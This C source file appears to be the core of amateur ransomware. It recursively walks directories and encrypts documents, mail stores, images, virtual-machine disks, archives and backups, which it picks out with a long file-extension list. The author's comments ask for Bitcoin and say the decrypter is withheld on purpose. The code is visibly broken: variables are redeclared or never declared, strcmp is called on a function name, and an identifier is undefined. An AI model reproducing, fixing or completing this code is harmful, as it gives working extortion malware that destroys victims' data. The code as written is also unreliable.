/*
please dont spread this :(
if you do, give me some BTC! I LOVE MONEY!!!! :D
enc is encrypt
im not giving out decrypter here.... :P
*/
#define _CRT_SECURE_NO_WARNINGS
#include "hell.h"
#include "filerecursion.h"

//it works... just need to get refernce to name

void start(const char *lol, int lmao)
{
	DIR *directory = opendir(lol);
	if (errno == ENOTDIR){
		//manage the file then
		managefile(lol, lol, enc);
	}
	else if (errno != 2){
		//then directory? we should go into it
		itsadirectory(lol, enc);

	}
	else {
		//tf...
		printf("Not a valid directory or file name\n");

		return;
	}
	if (directory != 0)
		closedir(directory);
}








void itsadirectory(const char * lol, int enc)
{
	DIR *directory = opendir(lol);
	if (directory == 0){
		return;
	}
	struct dirent * directory;
	while ((directory = readdir(directory)) != NULL) {
		//path can't be longer than 1024 bytes
		char * pathtogold = calloc(1, 1024);
    //dname is file name >.>
		if ((strcmp(directory->d_name, ".") == 0) || (strcmp(directory->d_name, "..") == 0)){
			free(fullpath);
			continue;
		}
		strcpy(pathtogold, lol);
		strcat(pathtogold, "/");
		strcat(pathtogold, directory->d_name);
    //DT REG IS file!
		if (directory->d_type == DT_REG){
    //yaaa!! its a file :P lets check ending and encrypt!
			managefile(pathtogold, fDirent->d_name, enc);
		}
    //DT Dir is DIR
		else if (directory->d_type == DT_DIR){
			// :( its another directory 
      
      itsadirectory(pathtogold, enc);
		}
		free(fullpath);
	}
  //
	char * fullpath = calloc(1, 1024);
	strcpy(fullpath, lol);
	strcat(fullpath, "/");
//
	free(fullpath);

	closedir(directory);
}

char *gettheextension(const char *nameofthefile)
{
	char *extension = strrchr(nameofthefile, '.');
	if (!extension || extension == nameofthefile){
  return "";
	}
  return dot + 1;
}







void managefile(const char * locationtofile, const char * nameofthefile, int enc)
{


	char * file_ext = get_filename_ext(locationtofile);
//theres a better way to do this, im not releasing my way :)
//gotta save my good shit for myself
	if (strcmp(gettheextension, "doc") == 0 ||
		strcmp(gettheextension, "docx") == 0 ||
		strcmp(gettheextension, "xlsx") == 0 ||
		strcmp(gettheextension, "xls") == 0 ||
		strcmp(gettheextension, "ppt") == 0 ||
		strcmp(gettheextension, "pptx") == 0 ||
		strcmp(gettheextension, "pst") == 0 ||
		strcmp(gettheextension, "ost") == 0 ||
		strcmp(gettheextension, "msg") == 0 ||
		strcmp(gettheextension, "eml") == 0 ||
		strcmp(gettheextension, "vsd") == 0 ||
		strcmp(gettheextension, "vsdx") == 0 ||
		strcmp(gettheextension, "txt") == 0 ||
		strcmp(gettheextension, "csv") == 0 ||
		strcmp(gettheextension, "rtf") == 0 ||
		strcmp(gettheextension, "123") == 0 ||
		strcmp(gettheextension, "wks") == 0 ||
		strcmp(gettheextension, "wk1") == 0 ||
		strcmp(gettheextension, "pdf") == 0 ||
		strcmp(gettheextension, "dwg") == 0 ||
		strcmp(gettheextension, "onetoc2") == 0 ||
		strcmp(gettheextension, "snt") == 0 ||
		strcmp(gettheextension, "jpeg") == 0 ||
		strcmp(gettheextension, "jpg") == 0 ||
		strcmp(gettheextension, "docb") == 0 ||
		strcmp(gettheextension, "docm") == 0 ||
		strcmp(gettheextension, "dot") == 0 ||
		strcmp(gettheextension, "dotm") == 0 ||
		strcmp(gettheextension, "dotx") == 0 ||
		strcmp(gettheextension, "xlsm") == 0 ||
		strcmp(gettheextension, "xlsb") == 0 ||
		strcmp(gettheextension, "xlw") == 0 ||
		strcmp(gettheextension, "xlt") == 0 ||
		strcmp(gettheextension, "xlm") == 0 ||
		strcmp(gettheextension, "xlc") == 0 ||
		strcmp(gettheextension, "xltx") == 0 ||
		strcmp(gettheextension, "xltm") == 0 ||
		strcmp(gettheextension, "pptm") == 0 ||
		strcmp(gettheextension, "pot") == 0 ||
		strcmp(gettheextension, "pps") == 0 ||
		strcmp(gettheextension, "ppsm") == 0 ||
		strcmp(gettheextension, "ppsx") == 0 ||
		strcmp(gettheextension, "ppam") == 0 ||
		strcmp(gettheextension, "potx") == 0 ||
		strcmp(gettheextension, "potm") == 0 ||
		strcmp(gettheextension, "edb") == 0 ||
		strcmp(gettheextension, "hwp") == 0 ||
		strcmp(gettheextension, "602") == 0 ||
		strcmp(gettheextension, "sxi") == 0 ||
		strcmp(gettheextension, "sti") == 0 ||
		strcmp(gettheextension, "sldx") == 0 ||
		strcmp(gettheextension, "sldm") == 0 ||
		strcmp(gettheextension, "vdi") == 0 ||
		strcmp(gettheextension, "vmdk") == 0 ||
		strcmp(gettheextension, "vmx") == 0 ||
		strcmp(gettheextension, "gpg") == 0 ||
		strcmp(gettheextension, "aes") == 0 ||
		strcmp(gettheextension, "ARC") == 0 ||
		strcmp(gettheextension, "PAQ") == 0 ||
		strcmp(gettheextension, "bz2") == 0 ||
		strcmp(gettheextension, "tbk") == 0 ||
		strcmp(gettheextension, "bak") == 0 ||
		strcmp(gettheextension, "zip") == 0 ||
		strcmp(gettheextension, "c") == 0
   
		)
	{
		if (enc == ENCRYPT) {
			encrypt_file(locationtofile, enc);

		}
if(enc== DECRYPT){
//heh you thought id give this free :D
}
	}

}
